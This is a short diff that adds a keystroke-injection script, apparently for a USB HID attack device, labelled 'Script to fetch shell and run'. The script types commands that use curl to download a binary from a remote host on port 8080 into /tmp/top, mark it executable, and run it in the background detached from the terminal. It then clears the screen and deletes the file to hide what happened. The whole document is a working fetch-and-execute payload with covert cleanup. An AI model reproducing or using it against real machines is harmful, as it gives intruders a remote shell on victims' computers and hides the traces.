@@ -1,0 +1,19 @@
+REM Script to fetch shell and run
+
+DEFAULT_DELAY 100
+
+REM Fetch File
+STRING curl -o /tmp/top http://
+WAIT_FOR_BUTTON_PRESS
+STRINGLN :8080/linux
+
+REM Run file
+STRINGLN chmod +x /tmp/top
+STRINGLN /tmp/top &
+STRINGLN disown
+
+REM Cleanup
+STRINGLN clear
+DELAY 500
+STRINGLN rm -f /tmp/top
+STRINGLN clear
